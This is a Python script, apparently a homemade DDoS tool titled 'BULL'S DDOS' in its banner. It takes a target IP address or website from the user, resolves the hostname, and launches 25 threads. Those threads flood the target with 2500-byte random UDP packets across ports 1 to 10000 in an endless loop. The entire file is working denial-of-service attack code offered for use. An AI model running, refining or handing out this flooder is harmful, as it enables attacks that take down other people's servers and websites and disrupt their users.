# this is homemade, DO NOT SELL IT AS YOUR OWN YOU SCRIPT KIDDIE!!

import time
import socket
import random
from threading import Thread as t
from colorama import Fore as c
import os  



print(c.RED+"""
/$$$$$$$  /$$   /$$ /$$       /$$ /$$    /$$$$$$             /$$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$ 
| $$__  $$| $$  | $$| $$      | $$| $/   /$$__  $$           | $$__  $$| $$__  $$ /$$__  $$ /$$__  $$
| $$  \ $$| $$  | $$| $$      | $$|_/   | $$  \__/           | $$  \ $$| $$  \ $$| $$  \ $$| $$  \__/
| $$$$$$$ | $$  | $$| $$      | $$      |  $$$$$$            | $$  | $$| $$  | $$| $$  | $$|  $$$$$$ 
| $$__  $$| $$  | $$| $$      | $$       \____  $$           | $$  | $$| $$  | $$| $$  | $$ \____  $$
| $$  \ $$| $$  | $$| $$      | $$       /$$  \ $$           | $$  | $$| $$  | $$| $$  | $$ /$$  \ $$
| $$$$$$$/|  $$$$$$/| $$$$$$$$| $$$$$$$$|  $$$$$$/           | $$$$$$$/| $$$$$$$/|  $$$$$$/|  $$$$$$/
|_______/  \______/ |________/|________/ \______/            |_______/ |_______/  \______/  \______/                                                                                                                                                                                                                                     
""")


print("\n")


print("\n")
##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#############


choice = input("IP address (y) or website (n): ").lower().replace(" ","")

print("\n")

ip = ""

if choice == "y":
    ip = input("What is the IP? ")
    print("\n")
elif choice == "n":
    website = input("What is the website? ").replace("https://","").replace("www.","").replace(" ","")
    ip = socket.gethostbyname(website)
    print("\n")

print("\n")
input("Press enter if you are ready!")
print("\n")
    
class counter():
    def __init__(self):
        self.count = 0
        self.waiting = False
    def add(self):
        self.count += 1
        return self.count
    def reset(self):
        self.count = 0
    def finish(self):
        self.count += 500000
    
c = counter()



def attack(count,ip):
    while True:
        try:
            if count.count+1 <= 10000:
                co = count.add()
                bytes = random._urandom(2500)
                sock.sendto(bytes, (ip,co))
                print("Sent packet to "+str(ip),co)
            else:
                if count.waiting == False:
                    count.waiting = True
                    time.sleep(5)
                    count.reset()
                    count.waiting = False
        except:
            pass

for i in range(25):
    t(target=attack,args=(c,ip,)).start()
